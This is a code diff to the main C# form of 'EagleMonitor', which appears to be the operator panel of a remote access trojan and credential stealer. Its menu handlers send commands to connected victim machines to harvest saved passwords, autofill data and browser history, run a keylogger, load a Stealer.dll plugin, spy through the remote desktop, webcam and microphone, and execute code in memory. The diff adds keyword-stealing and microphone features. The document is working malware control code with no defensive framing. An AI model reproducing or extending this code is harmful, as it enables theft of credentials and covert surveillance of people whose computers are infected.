@@ -27,7 +27,7 @@ namespace EagleMonitor
 
         private LoadSettings loadSettings;
         private Performance performance;    
-
+        
         public Main()
         {
             InitializeComponent();
@@ -104,8 +104,8 @@ namespace EagleMonitor
         {
             loadSettings = new LoadSettings(Settings);
             performance = new Performance(PerformanceCalculator);
-            performance.BeginInvoke(new AsyncCallback(EndPerformanceCalculator), this);
             loadSettings.BeginInvoke(new AsyncCallback(SettingsLoaded), this);
+            performance.BeginInvoke(new AsyncCallback(EndPerformanceCalculator), this);
         }
 
         private void dataGridView1_Leave(object sender, EventArgs e)
@@ -138,29 +138,6 @@ namespace EagleMonitor
             dataGridView1.ClearSelection();
         }
 
-        private void closeButton_Click(object sender, EventArgs e)
-        {
-            //TODO : Saves the logs
-            Miscellaneous.ToCSV(Program.logForm.dataGridView1);
-            Miscellaneous.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
-        }
-
-        private void maximizeButton_Click(object sender, EventArgs e)
-        {
-            if (this.WindowState == FormWindowState.Normal)
-            {
-                this.WindowState = FormWindowState.Maximized;
-            }
-            else
-            {
-                this.WindowState = FormWindowState.Normal;
-            }
-        }
-
-        private void minimizeButton_Click(object sender, EventArgs e)
-        {
-            this.WindowState = FormWindowState.Minimized;
-        }
 
         private void pictureBox2_MouseHover(object sender, EventArgs e)
         {
@@ -199,21 +176,24 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].passwordsForm != null)
-                    { ClientHandler.ClientHandlersList[IP].passwordsForm.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].passwordsForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].passwordsForm.Show(); 
+                    }
                     else
                     {
-                        ClientHandler.ClientHandlersList[IP].passwordsForm = new PasswordsForm(ClientHandler.ClientHandlersList[IP])
-                        {
-                            Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].HWID
-                        }; ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].passwordsForm.Show(); 
+                        ClientHandler.ClientHandlersList[IP].passwordsForm = new PasswordsForm(ClientHandler.ClientHandlersList[IP]); 
+                        ClientHandler.ClientHandlersList[IP].passwordsForm.Show(); 
                     }
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].passwordsForm = new PasswordsForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].passwordsForm.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].passwordsForm.Show();
+                    ClientHandler.ClientHandlersList[IP].passwordsForm = new PasswordsForm(ClientHandler.ClientHandlersList[IP]);
+                    ClientHandler.ClientHandlersList[IP].passwordsForm.Show();
                 }
                 finally
                 {
+                    ClientHandler.ClientHandlersList[IP].passwordsForm.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].passwordsForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].passwordsForm.loadingCircle1.Active = true;
                     ClientHandler.ClientHandlersList[IP].SendPacket(passwordsPacket);
@@ -233,24 +213,64 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].autofillForm != null)
-                    { ClientHandler.ClientHandlersList[IP].autofillForm.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].autofillForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].autofillForm.Show(); 
+                    }
                     else
                     {
-                        ClientHandler.ClientHandlersList[IP].autofillForm = new AutofillForm(ClientHandler.ClientHandlersList[IP])
-                        {
-                            Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].HWID
-                        }; ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].autofillForm.Show();
+                        ClientHandler.ClientHandlersList[IP].autofillForm = new AutofillForm(ClientHandler.ClientHandlersList[IP]); 
+                        ClientHandler.ClientHandlersList[IP].autofillForm.Show();
                     }
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].autofillForm = new AutofillForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].autofillForm.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].autofillForm.Show();
+                    ClientHandler.ClientHandlersList[IP].autofillForm = new AutofillForm(ClientHandler.ClientHandlersList[IP]);
+                    ClientHandler.ClientHandlersList[IP].autofillForm.Show();
                 }
                 finally
                 {
+                    ClientHandler.ClientHandlersList[IP].autofillForm.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].autofillForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].autofillForm.loadingCircle1.Active = true;
                     ClientHandler.ClientHandlersList[IP].SendPacket(autofillPacket);
+                }
+            }
+        }
+
+        private void keywordsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
+            {
+                string IP = dataGridViewRow.Cells[2].Value.ToString();
+                KeywordsPacket keywordsPacket = new KeywordsPacket
+                {
+                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+                };
+                try
+                {
+                    if (ClientHandler.ClientHandlersList[IP].keywordsForm != null)
+                    { 
+                        ClientHandler.ClientHandlersList[IP].keywordsForm.Show();
+                    }
+                    else
+                    {
+                        ClientHandler.ClientHandlersList[IP].keywordsForm = new KeywordsForm(ClientHandler.ClientHandlersList[IP]);
+                        ClientHandler.ClientHandlersList[IP].keywordsForm.label1.Text = "Keywords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName; ClientHandler.ClientHandlersList[IP].keywordsForm.Show();
+                    }
+                }
+                catch (Exception)
+                {
+                    ClientHandler.ClientHandlersList[IP].keywordsForm = new KeywordsForm(ClientHandler.ClientHandlersList[IP]);
+                    ClientHandler.ClientHandlersList[IP].keywordsForm.Show();
+                }
+                finally
+                {
+                    ClientHandler.ClientHandlersList[IP].keywordsForm.Text = "Keywords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].keywordsForm.label1.Text = "Keywords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].keywordsForm.loadingCircle1.Visible = true;
+                    ClientHandler.ClientHandlersList[IP].keywordsForm.loadingCircle1.Active = true;
+                    ClientHandler.ClientHandlersList[IP].SendPacket(keywordsPacket);
                 }
             }
         }
@@ -265,17 +285,24 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].fileManagerForm != null)
-                    { ClientHandler.ClientHandlersList[IP].fileManagerForm.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].fileManagerForm.Show(); }
+                    {
+                        ClientHandler.ClientHandlersList[IP].fileManagerForm.Show(); 
+                    }
                     else
-                    { ClientHandler.ClientHandlersList[IP].fileManagerForm = new FileManagerForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].fileManagerForm.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].fileManagerForm.Show(); }
-
+                    { 
+                        ClientHandler.ClientHandlersList[IP].fileManagerForm = new FileManagerForm(ClientHandler.ClientHandlersList[IP]);
+                        ClientHandler.ClientHandlersList[IP].fileManagerForm.Show();
+                    }
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].fileManagerForm = new FileManagerForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].fileManagerForm.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].fileManagerForm.Show();
+                    ClientHandler.ClientHandlersList[IP].fileManagerForm = new FileManagerForm(ClientHandler.ClientHandlersList[IP]); 
+                    ClientHandler.ClientHandlersList[IP].fileManagerForm.Show();
                 }
                 finally 
                 {
+                    ClientHandler.ClientHandlersList[IP].fileManagerForm.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].fileManagerForm.label1.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].fileManagerForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].fileManagerForm.loadingCircle1.Active = true;
                     ClientHandler.ClientHandlersList[IP].SendPacket(diskPacket);
@@ -293,17 +320,26 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].processManagerForm != null)
-                    { ClientHandler.ClientHandlersList[IP].processManagerForm.processDataGridView.Rows.Clear(); ClientHandler.ClientHandlersList[IP].processManagerForm.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].processManagerForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].processManagerForm.Show(); 
+                    }
                     else
-                    { ClientHandler.ClientHandlersList[IP].processManagerForm = new ProcessManagerForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].processManagerForm.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].processManagerForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].processManagerForm = new ProcessManagerForm(ClientHandler.ClientHandlersList[IP]); 
+                        ClientHandler.ClientHandlersList[IP].processManagerForm.Show();
+                    }
 
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].processManagerForm = new ProcessManagerForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].processManagerForm.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].processManagerForm.Show();
+                    ClientHandler.ClientHandlersList[IP].processManagerForm = new ProcessManagerForm(ClientHandler.ClientHandlersList[IP]);
+                    ClientHandler.ClientHandlersList[IP].processManagerForm.Show();
                 }
                 finally 
                 {
+                    ClientHandler.ClientHandlersList[IP].processManagerForm.processDataGridView.Rows.Clear(); 
+                    ClientHandler.ClientHandlersList[IP].processManagerForm.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].IP;
+                    ClientHandler.ClientHandlersList[IP].processManagerForm.label1.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].processManagerForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].processManagerForm.loadingCircle1.Active = true;
                     ClientHandler.ClientHandlersList[IP].SendPacket(processManagerPacket);
@@ -321,17 +357,25 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].keyloggerForm != null)
-                    { ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].keyloggerForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].keyloggerForm.Show(); 
+                    }
                     else
-                    { ClientHandler.ClientHandlersList[IP].keyloggerForm = new KeyloggerForm(IP); ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].keyloggerForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].keyloggerForm = new KeyloggerForm(IP); 
+                        ClientHandler.ClientHandlersList[IP].keyloggerForm.Show(); 
+                    }
 
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].keyloggerForm = new KeyloggerForm(IP); ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].keyloggerForm.Show();
+                    ClientHandler.ClientHandlersList[IP].keyloggerForm = new KeyloggerForm(IP); 
+                    ClientHandler.ClientHandlersList[IP].keyloggerForm.Show();
                 }
                 finally
                 {
+                    ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].IP;
+                    ClientHandler.ClientHandlersList[IP].keyloggerForm.label1.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].SendPacket(keylogPacket);
                 }
             }
@@ -359,24 +403,57 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].historyForm != null)
-                    { ClientHandler.ClientHandlersList[IP].historyForm.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].historyForm.Show(); }
+                    {                   
+                        ClientHandler.ClientHandlersList[IP].historyForm.Show(); 
+                    }
                     else
                     {
-                        ClientHandler.ClientHandlersList[IP].historyForm = new HistoryForm(ClientHandler.ClientHandlersList[IP])
-                        {
-                            Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].HWID
-                        }; ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].historyForm.Show();
+                        ClientHandler.ClientHandlersList[IP].historyForm = new HistoryForm(ClientHandler.ClientHandlersList[IP]);
+                        ClientHandler.ClientHandlersList[IP].historyForm.Show();
                     }
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].historyForm = new HistoryForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].historyForm.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].historyForm.Show();
+                    ClientHandler.ClientHandlersList[IP].historyForm = new HistoryForm(ClientHandler.ClientHandlersList[IP]);
+                    ClientHandler.ClientHandlersList[IP].historyForm.Show();
                 }
                 finally
                 {
+                    ClientHandler.ClientHandlersList[IP].historyForm.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].historyForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].historyForm.loadingCircle1.Active = true;
                     ClientHandler.ClientHandlersList[IP].SendPacket(historyPacket);
+                }
+            }
+        }
+
+        private void miscealleToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
+            {
+                string IP = dataGridViewRow.Cells[2].Value.ToString();
+                try
+                {
+                    if (ClientHandler.ClientHandlersList[IP].miscellaneousForm != null)
+                    { 
+                        ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show(); 
+                    }
+                    else
+                    {
+                        ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP]);
+                        ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
+                    }
+                }
+                catch (Exception)
+                {
+                    ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP]); 
+                    ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
+                }
+                finally
+                {
+                    ClientHandler.ClientHandlersList[IP].miscellaneousForm.Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].miscellaneousForm.label9.Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].fullName;
                 }
             }
         }
@@ -458,30 +535,6 @@ namespace EagleMonitor
             }
         }
 
-        private void miscellaneousPanelToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
-            {
-                string IP = dataGridViewRow.Cells[2].Value.ToString();
-                try
-                {
-                    if (ClientHandler.ClientHandlersList[IP].miscellaneousForm != null)
-                    { ClientHandler.ClientHandlersList[IP].miscellaneousForm.Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show(); }
-                    else
-                    {
-                        ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP])
-                        {
-                            Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].HWID              
-                        };ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
-                    }
-                }
-                catch (Exception)
-                {
-                    ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
-                }
-            }
-        }
-
         private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
@@ -491,15 +544,26 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].remoteDesktopForm != null)
-                    { ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show(); }
+                    {                 
+                        ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show(); 
+                    }
                     else
-                    { ClientHandler.ClientHandlersList[IP].remoteDesktopForm = new RemoteDesktopForm(IP, HWID); ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].remoteDesktopForm = new RemoteDesktopForm(IP); 
+                        ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show();
+                    }
 
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm = new RemoteDesktopForm(IP, HWID); ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show();
-                }     
+                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm = new RemoteDesktopForm(IP); 
+                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show();
+                }
+                finally
+                {
+                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm.label3.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].fullName;
+                }
             }
         }
 
@@ -510,42 +574,61 @@ namespace EagleMonitor
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
                 try
                 {
-                    if (ClientHandler.ClientHandlersList[IP].remoteCamera != null)
-                    { ClientHandler.ClientHandlersList[IP].remoteCamera.Text = "Remote Webcam: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].remoteCamera.Show(); }
+                    if (ClientHandler.ClientHandlersList[IP].remoteCameraForm != null)
+                    { 
+                        ClientHandler.ClientHandlersList[IP].remoteCameraForm.Show();
+                    }
                     else
-                    { ClientHandler.ClientHandlersList[IP].remoteCamera = new RemoteCamera(IP); ClientHandler.ClientHandlersList[IP].remoteCamera.Text = "Remote Webcam: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].remoteCamera.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].remoteCameraForm = new RemoteCameraForm(IP);
+                        ClientHandler.ClientHandlersList[IP].remoteCameraForm.Show();
+                    }
 
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].remoteCamera = new RemoteCamera(IP); ClientHandler.ClientHandlersList[IP].remoteCamera.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].remoteCamera.Show();
+                    ClientHandler.ClientHandlersList[IP].remoteCameraForm = new RemoteCameraForm(IP);
+                    ClientHandler.ClientHandlersList[IP].remoteCameraForm.Show();
+                }
+                finally 
+                {
+                    ClientHandler.ClientHandlersList[IP].remoteCameraForm.Text = "Remote Webcam: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm.label3.Text = "Remote Webcam: " + ClientHandler.ClientHandlersList[IP].fullName;
                 }
             }
         }
 
-        private void miscealleToolStripMenuItem_Click(object sender, EventArgs e)
+        private void remoteMicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
                 try
                 {
-                    if (ClientHandler.ClientHandlersList[IP].miscellaneousForm != null)
-                    { ClientHandler.ClientHandlersList[IP].miscellaneousForm.Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show(); }
+                    if (ClientHandler.ClientHandlersList[IP].remoteAudioForm != null)
+                    {
+                        ClientHandler.ClientHandlersList[IP].remoteAudioForm.Show();
+                    }
                     else
                     {
-                        ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP])
-                        {
-                            Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].HWID
-                        }; ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
+                        ClientHandler.ClientHandlersList[IP].remoteAudioForm = new RemoteAudioForm(IP); 
+                        ClientHandler.ClientHandlersList[IP].remoteAudioForm.Show();
                     }
+
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
+                    ClientHandler.ClientHandlersList[IP].remoteAudioForm = new RemoteAudioForm(IP);
+                    ClientHandler.ClientHandlersList[IP].remoteAudioForm.Show();
+                }
+                finally 
+                {
+                    ClientHandler.ClientHandlersList[IP].remoteAudioForm.Text = "Remote Microphone: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].remoteAudioForm.label2.Text = "Remote Microphone: " + ClientHandler.ClientHandlersList[IP].fullName;
                 }
             }
         }
+
 
         private void massTaskToolStripMenuItem1_Click(object sender, EventArgs e)
         {
@@ -568,18 +651,23 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].memoryExecutionForm != null)
-                    { ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Text = "Memory Execution: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show(); 
+                    }
                     else
                     {
-                        ClientHandler.ClientHandlersList[IP].memoryExecutionForm = new MemoryExecutionForm(ClientHandler.ClientHandlersList[IP])
-                        {
-                            Text = "Memory Execution: " + ClientHandler.ClientHandlersList[IP].HWID
-                        }; ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show();
+                        ClientHandler.ClientHandlersList[IP].memoryExecutionForm = new MemoryExecutionForm(ClientHandler.ClientHandlersList[IP]);
+                        ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show();
                     }
                 }
                 catch (Exception)
                 {
                     ClientHandler.ClientHandlersList[IP].memoryExecutionForm = new MemoryExecutionForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show();
+                }
+                finally 
+                {
+                    ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Text = "Memory Execution: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].memoryExecutionForm.label2.Text = "Memory Execution: " + ClientHandler.ClientHandlersList[IP].fullName;
                 }
             }
         }
@@ -592,14 +680,25 @@ namespace EagleMonitor
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].informationForm != null)
-                    { ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].informationForm.Show(); }
+                    {
+                        ClientHandler.ClientHandlersList[IP].informationForm.Show(); 
+                    }
                     else
-                    { ClientHandler.ClientHandlersList[IP].informationForm = new InformationForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].informationForm.Show(); }
+                    { 
+                        ClientHandler.ClientHandlersList[IP].informationForm = new InformationForm(ClientHandler.ClientHandlersList[IP]);
+                        ClientHandler.ClientHandlersList[IP].informationForm.Show();
+                    }
 
                 }
                 catch (Exception)
                 {
-                    ClientHandler.ClientHandlersList[IP].informationForm = new InformationForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].informationForm.Show();
+                    ClientHandler.ClientHandlersList[IP].informationForm = new InformationForm(ClientHandler.ClientHandlersList[IP]); 
+                    ClientHandler.ClientHandlersList[IP].informationForm.Show();
+                }
+                finally
+                {
+                    ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].informationForm.label5.Text = "Information: " + ClientHandler.ClientHandlersList[IP].fullName;
                 }
             }
         }
@@ -626,6 +725,30 @@ namespace EagleMonitor
         private void test456ToolStripMenuItem_Click(object sender, EventArgs e)
         {
 
+        }
+
+        private void closeButton_Click(object sender, EventArgs e)
+        {
+            //TODO : Saves the logs
+            Miscellaneous.ToCSV(Program.logForm.dataGridView1);
+            Miscellaneous.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
+        }
+
+        private void maximizeButton_Click(object sender, EventArgs e)
+        {
+            if (this.WindowState == FormWindowState.Normal)
+            {
+                this.WindowState = FormWindowState.Maximized;
+            }
+            else
+            {
+                this.WindowState = FormWindowState.Normal;
+            }
+        }
+
+        private void minimizeButton_Click(object sender, EventArgs e)
+        {
+            this.WindowState = FormWindowState.Minimized;
         }
     }
 }
